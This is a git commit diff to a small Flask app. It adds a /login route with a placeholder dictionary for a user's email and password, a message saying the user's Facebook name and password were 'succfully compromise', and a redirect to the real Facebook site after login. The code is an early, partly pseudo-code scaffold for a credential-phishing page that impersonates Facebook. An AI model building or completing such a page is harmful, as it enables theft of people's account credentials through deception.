bbffc97ec023bb0d728e22b4057cd910657749d1
mohammed <mdrame113@gmail.com>
2019-11-10 15:05:57 -0800

    pseudo code, rediret, get user data successfully

--- app.py
+++ app.py
@@ -1,4 +1,6 @@
-from flask import Flask, render_template
+from flask import Flask, render_template, redirect
+import requests
+
 
 
 
@@ -8,11 +10,27 @@ app = Flask(__name__)
 # home route 
 @app.route('/')
 def index():
-
+    
     return render_template('index.html')
     
 
+# user hit login button
+''' Create a route that takes both GET and POST methods
+and render the info in the input to desire destination '''
 
+@app.route('/login', methods = ['POST', 'GET'] )
+def login():
+    
+    # Add info in a dictionary
+    userCredential = {"Email": "User name or email ",
+                      "Password": " *************** " }
+
+    
+    ''' If user info is sucessfully passon to this route
+        take them to the official facebook page '''
+    test_message = "User facebook name and password succfully compromise"
+
+    return redirect('https://www.facebook.com/?stype=lo&jlou=AfeYCZSjoD8RTkU3MoAZ3Zzk5O6_0KBFaxHzBtgy8POvS64NNnPr6s4Lh040YN6f3EdvIxy-f2yf0dFkvw5bjKutIukOdXlipcRz7AVXK6b_EA&smuh=5272&lh=Ac_GsPJ4Lh-aUNQt')
 
 
 
